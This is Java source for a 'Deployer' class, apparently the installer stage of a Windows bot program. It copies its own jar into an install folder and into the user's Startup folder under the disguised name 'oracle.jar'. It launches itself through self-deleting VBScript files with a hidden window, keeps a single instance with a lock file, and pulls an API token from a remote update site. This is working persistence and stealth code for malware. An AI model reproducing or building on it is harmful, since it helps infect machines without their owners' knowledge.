package Main;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.net.URL;
import java.nio.channels.FileLock;

public class Deployer {

	Bot2d bot;
	boolean directoryChecked = false;
	
	public Deployer(Bot2d bot) {
		this.bot = bot;

		if(alreadyRunning()) {
			System.exit(0);
		} else {
			if(!alreadyMoved()) { 
				makeInstallPath();
				deployJar();
				startJar();
			}
		}
		getAPIKEY();
	}
	
	public void startJar() {
		try {
			PrintWriter writer = new PrintWriter("C:/Users/" + System.getProperty("user.name") + "/start.vbs", "UTF-8");
			writer.println("Dim fso");
			writer.println("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
			writer.println("Set WshShell = CreateObject(\"WScript.Shell\")");
			writer.println("dim a");
			writer.println("a = \"" + bot.getInstallPath() + "/launcher.jar\"");
			writer.println("WshShell.Run \"java -jar \" & chr(34) & a & chr(34), 0");
			writer.println("fso.DeleteFile Wscript.ScriptFullName");
			writer.close();
			String script = "C:/Users/" + System.getProperty("user.name") + "/start.vbs";
			String executable = "C:\\Windows\\System32\\wscript.exe"; 
			String cmdArr [] = {executable, script};
			Runtime.getRuntime().exec(cmdArr);
			System.exit(0);
		} catch (Exception e) {
			
		}
	}
	
	public boolean alreadyMoved() {
		String path = bot.getInstallPath() + "/launcher.jar";
		String currentPath = "";
		File f = new File(System.getProperty("java.class.path"));
		currentPath = f.getAbsoluteFile().toString().replace("\\", "/");
		if(currentPath.equals(path)) {
			return true;
		} else {
			return false;
		}
	}
	
	public void deployJar() {
		try {
			PrintWriter writer = new PrintWriter("C:/Users/" + System.getProperty("user.name") + "/transfer.vbs", "UTF-8");
			writer.println("Dim fso");
			writer.println("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
			File f = new File(System.getProperty("java.class.path"));
			writer.println("fso.CopyFile \"" + f.getAbsoluteFile().toString() + "\", \"" + bot.getInstallPath() + "/launcher.jar" + "\"");
			writer.println("fso.CopyFile \"" + f.getAbsoluteFile().toString() + "\", \"" + "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/oracle.jar\"");
			writer.println("fso.DeleteFile Wscript.ScriptFullName");
			writer.close();
			String script = "C:/Users/" + System.getProperty("user.name") + "/transfer.vbs";
			String executable = "C:\\Windows\\System32\\wscript.exe"; 
			String cmdArr [] = {executable, script};
			Runtime.getRuntime().exec(cmdArr);
		} catch (Exception e) {
			//Do nothing..
		}
	}
	
	public boolean makeInstallPath() {
		File file = new File(bot.getInstallPath());
		if(!file.exists()) {
			return file.mkdirs();
		}
		return false;
	}
	
	public boolean alreadyRunning() {
		try {
	        final File file = new File(bot.getInstallPath() + "/lock.lock");
	        final RandomAccessFile randomAccessFile = new RandomAccessFile(file, "rw");
	        final FileLock fileLock = randomAccessFile.getChannel().tryLock();
	        if (fileLock == null) {
	        	return true;
	        }
	        Runtime.getRuntime().addShutdownHook(new Thread() {
	        	public void run() {
	        		try {
	        			fileLock.release();
	        			randomAccessFile.close();
	        			file.delete();
	        		} catch (Exception e) {
	        			//log.error("Unable to remove lock file: " + lockFile, e);
	        		}
	        	}
	        });
	        return false;
	    } catch (Exception e) {
	       // log.error("Unable to create and/or lock file: " + lockFile, e);
	    }
	    return false;
	}
	
	public void getAPIKEY() {
		String apikey = "";
		try {
			URL url = new URL(bot.getUpdateWebsite() + "/token.txt");
			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
			apikey = in.readLine();
			bot.setAPIKEY(apikey);
		} catch (Exception e) {
			System.out.println("Error couldn't fetch apikey. " + e);
		}
	}
}
